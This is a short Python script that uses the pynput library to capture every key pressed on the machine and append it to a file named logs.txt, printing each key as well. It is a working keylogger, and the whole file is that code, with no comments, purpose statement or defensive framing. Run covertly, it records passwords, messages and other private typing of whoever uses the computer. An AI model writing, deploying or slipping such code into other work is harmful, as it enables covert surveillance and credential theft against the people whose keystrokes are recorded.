from pynput import keyboard

def on_press(key):
    file = open('logs.txt', 'a')
    try:
        print(key.char)
        file.write(str(key.char))
        file.close()
    except:
        print(key)
        file.write(str(key))
        file.close()

x = keyboard.Listener(on_press=on_press)
x.start()
x.join()